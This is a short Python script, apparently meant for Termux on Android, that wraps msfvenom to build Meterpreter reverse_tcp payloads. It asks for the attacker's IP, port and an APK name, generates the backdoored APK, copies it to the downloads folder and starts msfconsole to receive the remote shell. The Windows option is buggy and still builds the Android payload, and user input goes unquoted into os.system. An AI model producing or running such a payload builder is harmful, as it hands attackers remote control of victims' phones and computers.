import os

first = "android/meterpreter/reverse_tcp"
second = "windows/meterpreter/reverse_tcp"
print("available payloads:", first)
print("available payloads:", second)
print("___For selecting type: first or second___")
Android_payload = input("Enter the payload - first or second: ",)
os.system("ifconfig")
print("select your inet-'ip address'.")
lhost = input("Enter your ip address - ",)
lport = input("Enter your port number - ",)
print("Type apk name with '.apk' extension.")
apk_name = input("Enter apk name - ",)
if Android_payload == "first":
    msfvenom_sentence = "msfvenom -p "+first+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
    print(msfvenom_sentence)

elif Android_payload == "second":
    msfvenom_sentence = "msfvenom -p " +first+ " lhost" + "=" + lhost + " lport" + "=" + lport + " R> " + apk_name
    print(msfvenom_sentence)

else:
    print("wrong selection")
def payload():
    if Android_payload == "first":
        os.system(msfvenom_sentence)
        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
        os.system("msfconsole")
    elif Android_payload == "second":
        os.system(msfvenom_sentence)
        os.system("cp "+apk_name+" /data/data/com.termux/files/home/storage/downloads")
        os.system("msfconsole")
    else:
        print("Wrong syntax")
payload()

